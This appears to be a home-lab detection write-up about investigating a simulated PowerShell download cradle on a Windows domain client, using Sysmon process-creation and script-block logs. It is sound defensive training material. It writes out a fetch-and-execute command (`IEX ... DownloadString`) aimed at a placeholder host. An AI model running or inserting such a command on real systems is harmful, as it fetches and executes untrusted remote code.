# 04 – Suspicious PowerShell Execution

## Summary
A standard domain user (`HOMELAB\jit`) on CLIENT01 ran a PowerShell download-cradle,
`IEX (New-Object Net.WebClient).DownloadString(...)`. I investigated it as the admin
analyst (`coop`) by correlating two independent log sources for the same event.
The download returned a 404, so no payload was retrieved.

## The Simulated Activity
As `jit`, I ran the command in a new PowerShell process. The remote server returned
a 404 error, but the attempt still happened and was logged.

![jit running the command](jit-command.png)

## What I Observed

| Field | Sysmon (Event ID 1, Process Create) | PowerShell (Event ID 4104, Script Block) |
|---|---|---|
| Time | 10/6/2026 9:47:57 AM | 10/6/2026 9:48:00 AM |
| Process ID | 12004 | 12004 |
| User | HOMELAB\jit | (not in message, matched by process ID) |
| Content | CommandLine: `powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')"` | `IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')` |
| Other | Parent: powershell.exe (PID 12588), IntegrityLevel: Medium | ScriptBlock ID: 55c61888-557d-457f-affd-f25434984976 |

### Sysmon Event ID 1
![Sysmon process creation](sysmon-event1.png)

### PowerShell Event ID 4104
![PowerShell script block log](ps-4104.png)

## Why Both Sources Matter
- **Sysmon Event ID 1** answers who and what launched: the user, the process, its parent, and the privilege level.
- **Event ID 4104** answers what actually ran inside the process, which the process event alone doesn't show.
- When a command is typed into an open PowerShell window, Sysmon logs only that powershell.exe started, not the typed text. 4104 is what captures it.
- The shared process ID (12004) ties the two events together.

## Noise Worth Knowing
Process 12004 also produced several internal 4104 blocks (`$global:?`, `$_.OriginInfo`) from PowerShell printing the 404 error. These aren't attacker commands, and the analyst has to pick the block that carries the command.

## Why This Matters
`IEX` with `DownloadString` is a common pattern for fetching and running code from the internet without writing a file to disk.

## Next Steps in a Real Investigation
- Check the destination domain's reputation and whether the download succeeded.
- Look for network connection events (Sysmon Event ID 3) and DNS lookups for the same process.
- Review `jit`'s other activity around the same time.
- Confirm whether this user should ever run PowerShell at all.<img width="512" height="384" alt="VirtualBoxVM_2yC3QzCPSI" src="https://github.com/user-attachments/assets/367b14f0-7b86-42be-943f-68fa3ffb8b87" />

